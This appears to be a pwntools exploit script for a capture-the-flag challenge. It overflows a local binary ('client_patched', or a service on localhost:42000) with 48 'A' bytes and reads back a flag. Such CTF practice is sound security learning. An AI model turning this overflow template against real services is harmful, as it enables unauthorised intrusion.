from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]

elf = "./client_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b *main+47
    c
"""

conn = "localhost 42000"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

size = 48

io.sendlineafter(b'> ', b'A' * size)

io.recvuntil(b'flag: ')

flag = io.recvline()

print(f'flag: {flag}')

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
